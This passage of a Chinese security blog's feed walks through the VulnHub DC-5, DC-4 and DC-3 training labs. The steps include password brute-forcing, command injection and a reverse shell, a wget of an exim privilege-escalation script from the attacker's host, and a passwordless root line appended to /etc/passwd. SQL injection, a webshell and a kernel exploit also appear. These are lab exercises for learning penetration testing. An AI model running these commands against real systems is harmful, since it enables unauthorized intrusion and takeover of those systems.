alt="image-20240105225226138"></p><p>执行dc5.sh</p><p>注意给dc5.sh加执行权限</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">chmod <span class="token operator">+</span>x dc5<span class="token punctuation">.</span>shchmod <span class="token number">777</span> dc5<span class="token punctuation">.</span>sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105225541899.png" alt="image-20240105225541899"></p><p>拿到root用户，成功提权<br>在root目录下拿到flag</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105225605774.png" alt="image-20240105225605774"></p><h1 id="三-相关资源"><a href="#三-相关资源" class="headerlink" title="三.相关资源"></a>三.相关资源</h1><p>1、靶场下载地址<br>2、nmap<br>3、文中用到的字典<br>4、[ 隧道技术 ] 反弹shell的集中常见方式（一）nc反弹shell<br>5、[ 常用工具篇 ] burpsuite_pro 安装配置详解（附安装包）<br>6、简谈SUID提权<br>7、实现交互式shell的几种方式<br>8、masscan<br>9、[ 常用工具篇 ] AntSword 蚁剑安装及使用详解<br>10、Web日志目录及日志分析</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一-环境搭建&quot;&gt;&lt;a href=&quot;#一-环境搭建&quot; class=&quot;headerlink&quot; title=&quot;一.环境搭建&quot;&gt;&lt;/a&gt;一.环境搭建&lt;/h1&gt;&lt;h2 id=&quot;1-靶场描述&quot;&gt;&lt;a href=&quot;#1-靶场描述&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="渗透测试" scheme="http://ms02423.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="vulnhub靶场" scheme="http://ms02423.top/tags/vulnhub%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub靶场之DC-4</title>
    <link href="http://ms02423.top/2023/11/01/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8BDC-4/"/>
    <id>http://ms02423.top/2023/11/01/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8BDC-4/</id>
    <published>2023-11-01T05:06:06.000Z</published>
    <updated>2023-11-05T12:53:06.339Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一-环境搭建"><a href="#一-环境搭建" class="headerlink" title="一.环境搭建"></a>一.环境搭建</h2><h3 id="1-靶场描述"><a href="#1-靶场描述" class="headerlink" title="1.靶场描述"></a>1.靶场描述</h3><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">DC-4 <span class="token keyword">is</span> another purposely built vulnerable lab <span class="token keyword">with</span> the intent <span class="token keyword">of</span> gaining experience <span class="token keyword">in</span> the world <span class="token keyword">of</span> penetration testing<span class="token punctuation">.</span>Unlike the previous DC releases<span class="token punctuation">,</span> this one <span class="token keyword">is</span> designed primarily <span class="token keyword">for</span> beginners<span class="token operator">/</span>intermediates<span class="token punctuation">.</span> There <span class="token keyword">is</span> only one flag<span class="token punctuation">,</span> but technically<span class="token punctuation">,</span> <span class="token keyword">multiple</span> <span class="token keyword">entry</span> points <span class="token operator">and</span> <span class="token keyword">just</span> like <span class="token keyword">last</span> <span class="token keyword">time</span><span class="token punctuation">,</span> <span class="token keyword">no</span> clues<span class="token punctuation">.</span>Linux skills <span class="token operator">and</span> familiarity <span class="token keyword">with</span> the Linux command <span class="token keyword">line</span> <span class="token keyword">are</span> a must<span class="token punctuation">,</span> <span class="token keyword">as</span> <span class="token keyword">is</span> some experience <span class="token keyword">with</span> basic penetration testing tools<span class="token punctuation">.</span><span class="token keyword">For</span> beginners<span class="token punctuation">,</span> Google can be <span class="token keyword">of</span> great assistance<span class="token punctuation">,</span> but you can always tweet me <span class="token keyword">at</span> @DCAU7 <span class="token keyword">for</span> assistance <span class="token keyword">to</span> get you going again<span class="token punctuation">.</span> But take note<span class="token punctuation">:</span> I wo<span class="token string">n't give you the answer, instead, I'</span>ll give you an idea about how <span class="token keyword">to</span> <span class="token keyword">move</span> forward<span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>只有一个flag</p><h3 id="2-下载靶场环境"><a href="#2-下载靶场环境" class="headerlink" title="2.下载靶场环境"></a>2.下载靶场环境</h3><p>靶场下载地址：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">https://www.vulnhub.com/entry/dc-4,313/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>下载下来的文件如下</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231105175409887.png" alt="image-20231105175409887"></p><h3 id="3-启动靶场环境"><a href="#3-启动靶场环境" class="headerlink" title="3.启动靶场环境"></a>3.启动靶场环境</h3><p>下载下来是虚拟机压缩文件，直接用Vmvare导入就行。</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231105175509992.png" alt="image-20231105175509992"></p><p>虚拟机开启之后界面如下，我们不知道ip，需要自己探活，网段知道：192.168.52.0&#x2F;24</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231105175549010.png" alt="image-20231105175549010"></p><h2 id="二-渗透靶场"><a href="#二-渗透靶场" class="headerlink" title="二.渗透靶场"></a>二.渗透靶场</h2><h3 id="1-目标"><a href="#1-目标" class="headerlink" title="1.目标"></a>1.目标</h3><p>目标就是我们搭建的靶场，靶场IP为：192.168.52.0&#x2F;24</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231105175733083.png" alt="image-20231105175733083"></p><h3 id="2-寻找靶机真实IP"><a href="#2-寻找靶机真实IP" class="headerlink" title="2.寻找靶机真实IP"></a>2.寻找靶机真实IP</h3><p>使用nmap进行探活，寻找靶机ip</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231105175817726.png" alt="image-20231105175817726"></p><p>192.168.52.152是kali的ip地址，可以知道靶场ip地址是192.168.52.135</p><h3 id="3-探端口及服务"><a href="#3-探端口及服务" class="headerlink" title="3.探端口及服务"></a>3.探端口及服务</h3><p>使用nmap探活端口</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231105180101182.png" alt="image-20231105180101182"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">发现开放了<span class="token number">22</span>端口，存在ssh服务，OpenSSH <span class="token number">7</span><span class="token punctuation">.</span>4p1发现开放了<span class="token number">80</span>端口，存在web服务，nginx <span class="token number">1.15</span><span class="token number">.10</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>我们进行指纹识别</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231105180345525.png" alt="image-20231105180345525"></p><h3 id="4-访问服务"><a href="#4-访问服务" class="headerlink" title="4.访问服务"></a>4.访问服务</h3><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231105180521906.png" alt="image-20231105180521906"></p><h3 id="5-爆破用户名和密码"><a href="#5-爆破用户名和密码" class="headerlink" title="5.爆破用户名和密码"></a>5.爆破用户名和密码</h3><p>这里使用bp尝试获取弱口令抓个包，发送到爆破模块</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231105181347606.png" alt="image-20231105181347606"></p><p>设置好爆破点</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231105181442191.png" alt="image-20231105181442191"></p><p>用户名我使用常见用户名字典</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231105181600330.png" alt="image-20231105181600330"></p><p>字典使用1000-top</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231105181655111.png" alt="image-20231105181655111"></p><p>爆破中</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231105181732105.png" alt="image-20231105181732105"></p><p>爆破结果如下：<br>发现admin&#x2F;happy这一组返回包长度最长，猜想他就是账号密码</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231105181854739.png" alt="image-20231105181854739"></p><p>登录成功</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231105182210606.png" alt="image-20231105182210606"></p><h3 id="6-命令执行"><a href="#6-命令执行" class="headerlink" title="6.命令执行"></a>6.命令执行</h3><p>发现这里可以执行三种命令<br>点击list files好像是执行了ls -l</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231105182248635.png" alt="image-20231105182248635"></p><p>点击run抓个包看一下<br>发现真的是执行了ls -l</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231105192839659.png" alt="image-20231105192839659"></p><p>发现执行了ls并回返值，猜想能不能执行任意命令,把抓到的包放入重放攻击模块修改命令进行重放攻击由上面ls -l拼接方式看，我们可以知道空格使用+代替执行ls</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231105192859745.png" alt="image-20231105192859745"></p><p>执行whoami</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231105192939330.png" alt="image-20231105192939330"></p><p>执行id</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231105193017159.png" alt="image-20231105193017159"></p><p>执行ipadd</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231105193043822.png" alt="image-20231105193043822"></p><p>由上面的测试可知确实存在任意命令执行，空格由+代替</p><h3 id="7-反弹shell到kali"><a href="#7-反弹shell到kali" class="headerlink" title="7.反弹shell到kali"></a>7.反弹shell到kali</h3><p>1)攻击机监听</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231105193749216.png" alt="image-20231105193749216"></p><p>2)靶机连接</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231105193812943.png" alt="image-20231105193812943"></p><p>3)反弹shell成功</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231105193856932.png" alt="image-20231105193856932"></p><h3 id="8-进入交互式shell"><a href="#8-进入交互式shell" class="headerlink" title="8.进入交互式shell"></a>8.进入交互式shell</h3><p>我们知道上面的到的shell不好用，我们进入交互式shell</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">python -c <span class="token string">"import pty;pty.spawn('/bin/bash')"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231105193958607.png" alt="image-20231105193958607"></p><h3 id="9-teehee提权"><a href="#9-teehee提权" class="headerlink" title="9.teehee提权"></a>9.teehee提权</h3><p>这个靶机可以使用exim4提权也可以使用teehee提权，两种提权方式选择一种即可</p><p>1)查看当前权限</p><p>查看当前权限，不是root权限</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231105194150291.png" alt="image-20231105194150291"></p><p>2)发现old-passwords.bak文件</p><p>查看系统里面有什么文件在&#x2F;home&#x2F;jim&#x2F;backups下看到一个old-passwords.bak文件，看名字应该是一堆密码，而且是jim用户使用过的密码</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231105194333231.png" alt="image-20231105194333231"></p><p>打开看一下发现一堆密码</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231105194417486.png" alt="image-20231105194417486"></p><p>感觉可以做爆破字典把文件保存下来</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231105194720565.png" alt="image-20231105194720565"></p><p>3)爆破出jim的ssh密码<br>使用hydra爆破一下ssh密码</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">hydra -l jim -P <span class="token string">'/home/kali/桌面/password.txt'</span>  <span class="token number">192.168</span><span class="token number">.52</span><span class="token number">.135</span> ssh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>用户名为jim，密码为我们保存的old-passwords.bak.txt</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231105195131263.png" alt="image-20231105195131263"></p><p>果然爆破出一个一对用户密码:jim&#x2F;jibril04</p><p>4)使用kali登录jim</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231105195235521.png" alt="image-20231105195235521"></p><p>5)发现charles用户密码</p><p>继续探索在&#x2F;var&#x2F;spool&#x2F;mail目录下发现一封名为jim的邮件邮件内容大致为：我今天要去度假了，所以老板让我给你我的密码，以防有什么事情发生错了。也就是说这里我们又拿到了一个用户名和密码</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">Charles<span class="token operator">/</span>^xHhA<span class="token operator">&amp;</span>hvim0y<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231105195443134.png" alt="image-20231105195443134"></p><p>直接su 切换用户试试,提示没有这个用户名，那很明显首字母我们需要小写</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231105195528486.png" alt="image-20231105195528486"></p><p>密码是^xHhA&amp;hvim0y</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231105195610962.png" alt="image-20231105195610962"></p><p>10.teehee提权</p><p>1)查看使用sudo运行的命令</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231105195725838.png" alt="image-20231105195725838"></p><p>2)执行如下命令进行提权:echo “admin::0:0:::&#x2F;bin&#x2F;bash” | sudo teehee -a &#x2F;etc&#x2F;passwd </p><p>命令的意思大致利用teehee为把如下信息写到&#x2F;etc&#x2F;passwd里面，在用户名admin 没有密码为管理员权限，进入的时候运行&#x2F;bin&#x2F;bash</p><p>3)&#x2F;etc&#x2F;passwd 内每个字段含义如下</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">admin<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">/</span>bin<span class="token operator">/</span>bashusername<span class="token punctuation">:</span><span class="token keyword">password</span><span class="token punctuation">:</span>User <span class="token keyword">ID</span><span class="token punctuation">:</span><span class="token keyword">Group</span> <span class="token keyword">ID</span><span class="token punctuation">:</span>comment<span class="token punctuation">:</span>home directory<span class="token punctuation">:</span>shell<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>4)成功提权为root</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231105195954856.png" alt="image-20231105195954856"></p><p>10.发现flag.txt</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231105200110829.png" alt="image-20231105200110829"></p><h3 id="10-exim4提权"><a href="#10-exim4提权" class="headerlink" title="10.exim4提权"></a>10.exim4提权</h3><p>1)查看当前权限</p><p>查看当前权限，不是root权限</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231105200631938.png" alt="image-20231105200631938"></p><p>2)发现可以用exim4进行提权</p><p>看看具有SUID权限的命令</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / <span class="token parameter variable">-user</span> root <span class="token parameter variable">-perm</span> <span class="token parameter variable">-4000</span> <span class="token parameter variable">-print</span> <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>发现exim4命令具有SUID权限，exim4是可以用来提权的</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231105200727171.png" alt="image-20231105200727171"></p><p>查看查看exim4版本，发现exim4版本为4.89</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231105200810672.png" alt="image-20231105200810672"></p><p>3)寻找exim4提权脚本</p><p>本地漏洞库查找exim 4漏洞</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231105200939607.png" alt="image-20231105200939607"></p><p>exim4版本为4.89，发现有好几个可以用，还有两个提权，这里我们选用46996</p><p>4)上传提权脚本到靶机</p><p>开启apache服务</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">systemctl start apache2.service <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将选用的46996拷贝到kali的apache web页面下</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231105201115741.png" alt="image-20231105201115741"></p><p>访问kali服务下载提权脚本</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231105201319417.png" alt="image-20231105201319417"></p><p>DC-4下载提权脚本</p><p>wget <a href="http://192.168.52.152/46996.sh">http://192.168.52.152/46996.sh</a></p><p>提示可以访问，但拒绝访问，可能是目录权限不够，尝试切换到&#x2F;tmp目录进行下载</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231105201427670.png" alt="image-20231105201427670"></p><p>成功下载提权脚本</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231105201514483.png" alt="image-20231105201514483"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231105201553893.png" alt="image-20231105201553893"></p><p>5)exim4提权</p><p>我们已经上传了提权脚本到靶机，接下来我们需要运行脚本进行提权</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ls</span> <span class="token parameter variable">-l</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231105201643908.png" alt="image-20231105201643908"></p><p>查看脚本权限，发现没有执行权限，我们需要给脚本加执行权限</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231105201711413.png" alt="image-20231105201711413"></p><p>6)执行脚本</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231105202016060.png" alt="image-20231105202016060"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231105202200536.png" alt="image-20231105202200536"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231105202234404.png" alt="image-20231105202234404"></p><h1 id="三、相关资源"><a href="#三、相关资源" class="headerlink" title="三、相关资源"></a>三、相关资源</h1><p>1、靶场下载地址<br>2、[ 隧道技术 ] 反弹shell的集中常见方式（一）nc反弹shell<br>3、[ 常用工具篇 ] burpsuite_pro 安装配置详解（附安装包）<br>4、arp-scan<br>5、文中用到的字典<br>6、nmap<br>7、masscan<br>8、whatweb<br>9、实现交互式shell的几种方式<br>10、[ 隧道技术 ] 反弹shell的集中常见方式（一）nc反弹shell<br>11、提权辅助工具集合<br>12、简谈SUID提权<br>13、[ 常用工具篇 ] AntSword 蚁剑安装及使用详解</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;一-环境搭建&quot;&gt;&lt;a href=&quot;#一-环境搭建&quot; class=&quot;headerlink&quot; title=&quot;一.环境搭建&quot;&gt;&lt;/a&gt;一.环境搭建&lt;/h2&gt;&lt;h3 id=&quot;1-靶场描述&quot;&gt;&lt;a href=&quot;#1-靶场描述&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="渗透测试" scheme="http://ms02423.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="vulnhub靶场" scheme="http://ms02423.top/tags/vulnhub%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub靶场之DC-3</title>
    <link href="http://ms02423.top/2023/10/23/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8BDC-3/"/>
    <id>http://ms02423.top/2023/10/23/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8BDC-3/</id>
    <published>2023-10-23T06:40:16.000Z</published>
    <updated>2023-10-30T07:37:37.158Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一-环境搭建"><a href="#一-环境搭建" class="headerlink" title="一. 环境搭建"></a>一. 环境搭建</h1><h2 id="1-靶机描述"><a href="#1-靶机描述" class="headerlink" title="1.靶机描述"></a>1.靶机描述</h2><p>DC-3是另一个专门建造的易受攻击的实验室，旨在获得渗透测试领域的经验。</p><p>与以前的 DC 版本一样，这个版本是为初学者设计的，尽管这一次只有一个标志，一个入口点，根本没有任何线索。</p><p>Linux 技能和对 Linux 命令行的熟悉是必须的，对基本渗透测试工具的一些经验也是必须的。</p><h2 id="2-靶机下载地址"><a href="#2-靶机下载地址" class="headerlink" title="2.靶机下载地址"></a>2.靶机下载地址</h2><p>  <a href="https://www.vulnhub.com/entry/dc-32,312/">https://www.vulnhub.com/entry/dc-32,312/</a></p><h2 id="3-网卡设置"><a href="#3-网卡设置" class="headerlink" title="3.网卡设置"></a>3.网卡设置</h2><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231023144642255.png" alt="image-20231023144642255"></p><p>我们开启虚拟机，但是遇到了问题</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231023144659544.png" alt="image-20231023144659544"></p><p>我们通过下面方法解决:</p><p><a href="https://blog.csdn.net/Aluxian_/article/details/123677000">https://blog.csdn.net/Aluxian_/article/details/123677000</a></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231023144714116.png" alt="image-20231023144714116"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231023144723375.png" alt="image-20231023144723375"></p><h1 id="二-靶机渗透"><a href="#二-靶机渗透" class="headerlink" title="二.靶机渗透"></a>二.靶机渗透</h1><h2 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h2><p>我们使用nmap扫描，确定靶场地址</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231023144857076.png" alt="image-20231023144857076"></p><p>我们知道192.168.52.128&#x2F;152是kali地址</p><p>靶机地址为192.168.52.133</p><h2 id="2-进行端口扫描及服务"><a href="#2-进行端口扫描及服务" class="headerlink" title="2.进行端口扫描及服务"></a>2.进行端口扫描及服务</h2><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231023145038066.png" alt="image-20231023145038066"></p><p>只有一个80端口，服务是apache2</p><h2 id="3-访问服务"><a href="#3-访问服务" class="headerlink" title="3.访问服务"></a>3.访问服务</h2><p>我们进行访问<a href="http://192.168.52.133/">http://192.168.52.133</a></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231023145143835.png" alt="image-20231023145143835"></p><p>我们知道是一个joomla插件</p><h2 id="4-进行渗透测试"><a href="#4-进行渗透测试" class="headerlink" title="4.进行渗透测试"></a>4.进行渗透测试</h2><p>1)Joomla 是类似织梦、wp等流行的一款CMS软件，可以非常快速地发布一个精美的网站。在kali下如何检测Joomla是否存在可以利用的漏洞呢？如果您的网站正在运行 Joomla，您可以对您的网站使用 JoomScan 实用程序来发现漏洞或仅提供有助于攻击您网站的一般信息。一旦您意识到该网站的弱点，您就可以采取适当的措施来保护它。JoomScan 的工作原理与 WPScan 类似，后者用于扫描 WordPress 网站的漏洞。</p><p>2)OWASPJoomla！漏洞扫描器（JoomScan）是一个开源项目，其主要目的是实现漏洞检测的自动化，以增强Joomla CMS开发的安全性。</p><p>3)使用该–url或者-u参数指定 Joomla 站点的 URL，以便使用 JoomScan 对其进行扫描</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">joomscan --url http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.52</span><span class="token number">.133</span><span class="token operator">/</span>joomscan -u http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.52</span><span class="token number">.133</span><span class="token operator">/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231023145824186.png" alt="image-20231023145824186"></p><p>4)我们扫描到了后台地址和版本3.7.0</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231023145919326.png" alt="image-20231023145919326"></p><p>5)我们使用kali的searchsploit检测漏洞</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231023150200692.png" alt="image-20231023150200692"></p><p>可以看到存在SQL注入漏洞</p><h2 id="5-漏洞验证"><a href="#5-漏洞验证" class="headerlink" title="5.漏洞验证"></a>5.漏洞验证</h2><p>1)使用poc进行SQL注入</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231023150433270.png" alt="image-20231023150433270"></p><p>2)验证漏洞是否存在</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231023150706213.png" alt="image-20231023150706213"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231023150736457.png" alt="image-20231023150736457"></p><p>可以看到存在SQL注入漏洞</p><p>3)我们爆破数据库</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231023150839408.png" alt="image-20231023150839408"></p><p>4)我们爆破joomladb数据库的表名</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231023150953322.png" alt="image-20231023150953322"></p><p>我们可以看到_users这个表名</p><p>5)我们进行爆破_users表名</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231023152237346.png" alt="image-20231023152237346"></p><p>我们可以看到用户名和密码</p><p>6)我们进行爆破</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231023152428205.png" alt="image-20231023152428205"></p><p>我们可以看到用户名爆破出来了，密码是加密的，我们进行解密</p><p>7)解密密码</p><p>我们可以看到密码首部是2y，表示该加密方式为Blowfish。</p><p>我们使用john爆破密码</p><p>john 是一款大受欢迎的、免费的开源软件、基于字典的密码破解工具。用于在已知密文的情况下尝试破解出明文的破解密码软件</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231023152618490.png" alt="image-20231023152618490"></p><p>我们爆破密码是snoopy</p><h2 id="6-文件上传漏洞"><a href="#6-文件上传漏洞" class="headerlink" title="6.文件上传漏洞"></a>6.文件上传漏洞</h2><p>1)我们登录网站</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231023160537295.png" alt="image-20231023160537295"></p><p>2)我们可以看到有新建文件的地方</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231023160644458.png" alt="image-20231023160644458"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231023160723520.png" alt="image-20231023160723520"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231023160846628.png" alt="image-20231023160846628"></p><p>3)我们写入一句话木马</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231023160927555.png" alt="image-20231023160927555"></p><p>4)我们进行访问</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231023161746016.png" alt="image-20231023161746016"></p><p>5)我们连接蚁剑</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231023162305646.png" alt="image-20231023162305646"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231023161832251.png" alt="image-20231023161832251"></p><p>6)下载辅助脚本Linux-Exploit-Suggester.sh</p><p>下载地址<a href="https://github.com/mzet-/linux-exploit-suggester">https://github.com/mzet-/linux-exploit-suggester</a></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231023162449080.png" alt="image-20231023162449080"></p><p>ls -l linux-exploit-suggester.sh</p><p>7)发现没有执行权限，我们给他加个执行文件</p><p>chmod +x linux-exploit-suggester.sh</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231030151124133.png" alt="image-20231030151124133"></p><p>8)使用辅助脚本提权</p><p> 获取提权脚本</p><p>我们使用CVE-2016-4557</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231030151248430.png" alt="image-20231030151248430"></p><p>给出的链接无法下载，我们去kali里面寻找</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231030151542971.png" alt="image-20231030151542971"></p><p>我们进行下载，并且上传到蚁剑</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231030151614606.png" alt="image-20231030151614606"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231030151707748.png" alt="image-20231030151707748"></p><p>我们进行解压</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231030152008683.png" alt="image-20231030152008683"></p><p>获得root权限</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231030153555291.png" alt="image-20231030153555291"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231030153602386.png" alt="image-20231030153602386"></p><h1 id="三-相关知识点"><a href="#三-相关知识点" class="headerlink" title="三.相关知识点"></a>三.相关知识点</h1><p>1.joomscan</p><p>2.Nikto</p><p>3.实现交互式shell的几种方式</p><p>4.[ 隧道技术 ] 反弹shell的集中常见方式（一）nc反弹shell</p><p>5.提权辅助工具</p><p>6.Linux-Exploit-Suggester.sh</p><p>7.jhon</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一-环境搭建&quot;&gt;&lt;a href=&quot;#一-环境搭建&quot; class=&quot;headerlink&quot; title=&quot;一. 环境搭建&quot;&gt;&lt;/a&gt;一. 环境搭建&lt;/h1&gt;&lt;h2 id=&quot;1-靶机描述&quot;&gt;&lt;a href=&quot;#1-靶机描述&quot; class=&quot;headerlink&quot; ti</summary>
      
    
    
    
    <category term="渗透测试" scheme="http://ms02423.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="vulnhub靶场" scheme="http://ms02423.top/tags/vulnhub%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub靶场之DC-2</title>
    <link href="http://ms02423.top/2023/10/13/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8BDC-2/"/>
    <id>http://ms02423.top/2023/10/13/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8BDC-2/</id>
    <published>2023-10-13T13:22:57.000Z</published>
    <updated>2023-10-13T15:02:13.219Z</updated>
    
